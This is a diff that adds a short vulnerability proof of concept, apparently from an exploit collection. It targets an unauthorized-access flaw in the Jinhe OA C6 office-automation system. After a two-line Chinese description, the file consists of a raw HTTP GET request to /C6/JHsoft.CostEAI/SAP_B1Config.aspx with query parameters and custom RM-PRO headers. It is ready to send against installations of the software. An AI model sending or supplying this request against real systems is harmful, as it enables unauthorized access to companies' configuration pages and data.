@@ -1,0 +1,9 @@
+# 金和OA SAP_B1Config.aspx 未授权访问漏洞
+# 金和OA是一款企业级办公自动化软件,旨在提供高效的办公流程管理和协作解决方案。C6协同系统存在未授权访问漏洞。
+GET /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1&acid=80051412&bid=hd_tag_m8mv23qf HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23qf
+RM-PRO-Token: fe879ccb611487f73eb6af4021d63fd4
+RM-PRO-Time: 1742808336988
+User-Agent: curl/7.83.1
+
